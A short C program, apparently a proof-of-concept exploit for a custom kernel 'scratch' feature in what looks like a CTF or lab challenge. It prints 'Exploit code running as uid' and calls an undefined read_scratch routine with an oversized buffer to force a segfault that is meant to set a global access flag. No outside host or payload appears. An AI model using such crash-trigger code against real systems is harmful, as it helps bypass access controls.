#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sched.h>

#define PR_SET_SCRATCH_HOLE		0x53534352
void load_scratch(uint64_t slice, uint64_t slice_offset, void *source, uint64_t length);
void read_scratch(uint64_t slice, uint64_t slice_offset, void *destination, uint64_t length);


void trigger_crash() {
    size_t slice_size_value = 0x10000; // > 33 * 1024
    uint64_t *d = malloc(slice_size_value);
    puts("Segfaulting...: this should set access_enabled=1 globally!");
    getchar();
    read_scratch(2, 0, d, slice_size_value);
    puts("[!!!] This should not happen!");
}

int main(int argc, char* argv []) {
    int uid = getuid();
    printf("[main] Exploit code running as uid=%d, gid=%d\n", uid, getgid());
    trigger_crash();
    return 0;
}
